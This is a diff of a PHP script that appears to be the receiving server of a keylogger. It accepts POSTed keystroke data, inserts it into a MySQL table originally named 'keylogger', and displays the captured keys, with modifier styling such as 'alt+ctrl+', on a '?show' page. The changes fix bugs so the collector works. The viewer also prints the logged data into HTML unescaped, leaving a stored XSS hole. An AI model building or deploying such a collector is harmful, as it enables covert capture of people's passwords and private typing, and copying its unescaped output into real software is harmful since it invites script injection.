@@ -13,7 +13,8 @@ class ServerLogger
 		'database'	=> 'mailing_list',
 		'table'		=> 'maile',
 	);
-
+	var $data = array();
+	
 	var $connection = null;
 	
 	function set_db($db, $value = null)
@@ -58,11 +59,11 @@ class ServerLogger
 	
 	function __construct( $post = array() )
 	{
-		if (empty( $post ) || empty($post->data))
+		if (empty( $post ) || empty($post[data]))
 		{
 			return;
 		}
-		$this->set_field( 'data', $post->data );
+		$this->set_field( 'data', $post[data] );
 	}
 	
 	function insert_to_db()
@@ -78,7 +79,6 @@ class ServerLogger
 			$values[] = "'" . mysql_real_escape_string($value) . "'";
 		}
 		$query = "INSERT INTO `{$this->db['table']}` (". implode(',', $fields ) .") VALUES (" . implode(',', $values ) . ")";
-		echo $query;
 		return @mysql_query($query);
 	}
 	
@@ -86,29 +86,30 @@ class ServerLogger
 	{
 		$this->connection = @mysql_connect($this->db['host'],$this->db['user'],$this->db['password']);
 		@mysql_select_db( $this->db['database'] );
-		$result = @mysql_query("SELECT time, data from `{$this->db['table']}` ORDER time DESC");
-		while($row = mysql_fetch_row($result))
+		$result = @mysql_query("SELECT time, data from `{$this->db['table']}` ORDER BY time DESC");
+		$output = '';
+		while($row = mysql_fetch_array($result, MYSQL_NUM))
 		{
-			echo "<h1>{$result[0]}</h1>{$result[0]}"; 
+			$output .= "<h1>{$row[0]}</h1>{$row[1]}"; 
 		}
-		
+		return $output;
 	}
 
 }
 
-header("Content-type: text/plain");
-$x = new ServerLogger( json_decode($HTTP_RAW_POST_DATA) );
+$x = new ServerLogger( $_POST );
 $x->set_db ( array(
 	'host'		=> '',
 	'user'		=> '',
 	'password'	=> '',
 	'database'	=> '',
-	'table'		=> 'keylogger', # 2 columns: time(timestamp), data (longtext)
+	'table'		=> '',
 ) );
 
 
 if(isset($_GET['show']))
 {
+	header("Content-type: text/html; charset=UTF-8");
 	echo '<!DOCTYPE html><html><head><meta charset="utf-8">'
 	.'<style>'
 	.'i{font-style:normal;border:1px solid #bbb;border-radius:3px;letter-spacing:-1px;margin-right:1px;padding:0 2px;} '
@@ -125,7 +126,7 @@ if(isset($_GET['show']))
 	.'i[altctrl]:before {content:"alt+ctrl+"} '
 	.'</style>'
 	.'</head><body style="font-family:monospace;line-height:20px;font-size:13px">'
-	.$x->present_log()
+	. $x->present_log()
 	
 	.'</body></html>' . "\n";
 
@@ -133,6 +134,7 @@ if(isset($_GET['show']))
 }
 else
 {
+	header("Content-type: text/plain; charset=UTF-8");
 	if(!$x->insert_to_db())
 	{
 		header('HTTP/1.0 404 Not Found');
